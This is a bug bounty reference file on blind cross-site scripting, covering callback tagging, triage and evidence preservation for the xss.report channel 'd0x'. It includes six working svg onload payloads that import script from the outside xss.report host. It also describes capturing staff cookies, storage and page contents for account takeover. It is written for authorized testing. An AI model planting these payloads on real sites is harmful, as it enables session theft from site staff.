# Callback Setup, Tagging & Triage — xss.report channel `d0x`

Use this reference only for blind, delayed, or cross-user renders that cannot be observed directly. The preserved d0x callback base is `//xss.report/c/d0x/`. Default to an attribution-only marker; collect sensitive material only from accounts and objects controlled by d0x and only when program policy permits it.

The out-of-band channel is what makes blind XSS observable. d0x uses **xss.report**, channel ID `d0x`, callback base `//xss.report/c/d0x/`. This file covers the tagging scheme, what a landed hit gives you, and the false-positive filter — so you spend escalation effort only on real privileged-context hits.

## Per-point tagging (do this for every planted payload)

Append a unique `?src=<tag>` to the callback URL of every injection point. When a hit lands, the tag tells you **which input** fired in **which origin** — without it, a spray of 40 points gives you an unattributable callback.

```
<svg/onload=import('//xss.report/c/d0x/?src=ticket-subject')>
<svg/onload=import('//xss.report/c/d0x/?src=billing-company')>
<svg/onload=import('//xss.report/c/d0x/?src=profile-displayname')>
<svg/onload=import('//xss.report/c/d0x/?src=ua-header')>
<svg/onload=import('//xss.report/c/d0x/?src=upload-filename')>
<svg/onload=import('//xss.report/c/d0x/?src=oauth-clientname')>
```

Naming: `<surface>-<field>`, unique per point, kept in the spray ledger `targets/<program>/notes/xss-spray.md` alongside the payload variant and the date planted. When you rotate a payload variant on the same point (e.g. the svg was filtered, you tried `details/ontoggle`), suffix the tag (`ticket-subject-v2`) so you learn which variant defeated the filter.

## What a landed hit captures

The xss.report panel records, per callback, the material you escalate from:

- **Origin** — the full URL that loaded the script. This is the **privileged context**. Read host + path: `/admin`, `/staff`, `/agent`, an internal tool subdomain, or a headless-renderer worker. This single field decides severity.
- **Cookies** — everything `document.cookie` could read from that origin. Often the staff session (unless HttpOnly). Present = staff-ATO path.
- **DOM snapshot** — the rendered page. Frequently contains internal data: customer names/emails in a ticket view, internal ticket counts, admin usernames, internal hostnames, CSRF tokens, feature flags.
- **local / session storage** — internal tokens, config, sometimes API bases and internal service URLs.
- **Referrer + User-Agent** — the staff browser's referrer (reveals the internal navigation / tool path) and UA (internal build strings).
- **Screenshot** — on some tiers; direct visual proof of the privileged UI.

## Triage checklist for a landed hit

1. **Is the origin YOU?** Compare the callback origin/IP against your own testing IP and the customer-facing host you injected from. A hit from your own browser is you triggering the script during testing — **not** a finding.
2. **Is the origin a sandbox/preview?** SES/email-render bots, link-preview crawlers, and some AV/URL-scanners load payloads. A hit from an obviously automated preview sandbox with no privileged data is informational — keep spraying, don't submit it.
3. **Is the origin actually privileged?** An `/admin`, `/staff`, `/agent`, internal-tool-subdomain, or headless-renderer origin = yes. A hit from the same customer host with no privileged context is Self-XSS in disguise (see the self-XSS rule in `escalation.md`).
4. **Map the tag → input.** The `?src=` tells you the exact stored field; confirm it in the ledger. This is your reproduction path.
5. **Grade the capture.** Cookie present (not HttpOnly) → staff-ATO path. HttpOnly → pivot to the same-session internal read (`escalation.md`). DOM contains internal data → read one identifier as proof.

Then go to `escalation.md` — a triaged privileged hit is the _start_ of the finding, not the end.

## False positives to discard (do not submit these)

- Callback origin is **your own IP / testing browser** — you fired it yourself.
- Callback from an **email/link-preview/AV sandbox** with no privileged UI or data — informational; triagers routinely N/A these.
- Origin is the **same customer domain** you injected from, no privileged context, no other-user render — Self-XSS.
- Only **HttpOnly** cookies present and you never demonstrated the same-session internal read — the primitive is real but you have not yet shown impact; go get the internal read before submitting, or severity collapses.

If a hit is a false positive, note it in the ledger (`tag → FP: <reason>`) so you don't re-chase it, and return to spraying / working the real hits.

## Evidence to preserve for the report

For a real privileged hit, capture into `targets/<program>/notes/` (and promote to `targets/<program>/findings/` once `validation` returns a verdict):

- The **origin** (redact any victim PII in the URL, keep host+path).
- The **injection request** (from Caido) that planted the payload + the exact payload/variant + tag.
- The escalation proof from `escalation.md`: the exfil'd token _class_ (decoded header/claims, not the raw victim value in the report), or the **one** internal record read through the session (redacted), or the PDF-engine file-read output.
- A negative control: the same field with a benign value produces no callback.
- Timestamp of plant vs. callback (shows the delayed, staff-triggered fire).

Redact victim PII per program policy in the report; the working `findings/` file keeps enough to reproduce. Always run a High/Critical through `validation` first.
